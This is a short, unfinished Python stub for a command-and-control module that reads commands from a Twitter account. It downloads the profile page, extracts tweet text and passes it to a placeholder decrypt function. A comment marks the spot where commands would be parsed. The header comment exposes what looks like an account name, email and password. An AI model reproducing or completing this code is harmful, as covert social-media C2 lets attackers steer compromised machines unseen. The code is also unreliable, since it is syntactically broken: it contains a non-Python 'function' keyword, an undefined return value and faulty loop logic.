# module for twitter c2
# kolache2 : a3829593@drdrb.net : Fl@kyP@stry!@#!@#

import urllib

passphrase = "bananahead"

function decrypt(message):
	
	return decmessage

#need to fix for actual twitter handle
urlhandle = urllib.urlopen("http://twitter.com/kolache2")
urldata = urlhandle.read()

c=0
while c < len(urldata):
	ccont = urldata.find("js-tweet-text", c)
	if ccont == -1:
		# nothing to do here
		print("No tweets available")
		exit(-1)
	prstr = urldata[ccont:urldata.find("</p>",ccont)]
	# add in parsing of commands here in place of print
	encstr = prstr[prstr.find(">")+1:]
	decstr = decrypt(encstr)
	print decstr
	c = c + ccont + len(prstr)
